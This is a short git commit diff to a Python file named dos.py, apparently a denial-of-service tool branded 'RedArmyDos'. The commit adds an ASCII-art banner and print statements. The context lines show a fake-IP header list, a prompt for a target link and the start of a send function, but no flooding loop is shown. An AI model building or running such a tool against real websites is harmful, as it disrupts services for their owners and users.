2b277cd1dfa9a1234894e45c476e3395ea01a52d
SverxUtinka <76646574+SverxUtinka@users.noreply.github.com>
2021-01-16 10:22:45 +0200

    Add files via upload

--- dos.py
+++ dos.py
@@ -9,7 +9,36 @@ user = [FakeIp]
 
 headers = {'0': random.choice(user)}
 
+wl = [
+	'PPPPPPPPPPPPPPPPPPPPPPPPP',
+	'PPPPPPPPPPPPPP    PPPPPPP',
+	'PPPPPPP   PPPPPPP  PPPPPP',
+	'PPPPP     PPPPPPPP  PPPPP',
+	'PPP       PPPPPPPPP  PPPP',
+	'PPPPPPPPP   PPPPPPPP  PPP',
+	'PPPPPPPPPPP   PPPPPP   PP',
+	'PPPPPPPPPPPPP   PPPP   PP',
+	'PPPPPPPPPPPPPPP   PP  PPP',
+	'PPPPP     PPPPPPP    PPPP',
+	'PPP  PPPPP            PPP',
+	'P   PPPPPPPPPPPPPPPPP  PP',
+	'PPPPPPPPPPPPPPPPPPPPPPPPP'
+]
+
 #работа
+print(wl[0])
+print(wl[1])
+print(wl[2])
+print(wl[3])
+print(wl[4])
+print(wl[5])
+print(wl[6])
+print(wl[7])
+print(wl[8])
+print(wl[9])
+print(wl[10])
+print(wl[11])
+print(wl[12])
 print('RedArmyDos')
 adres = str(input('link:'))
 def send():
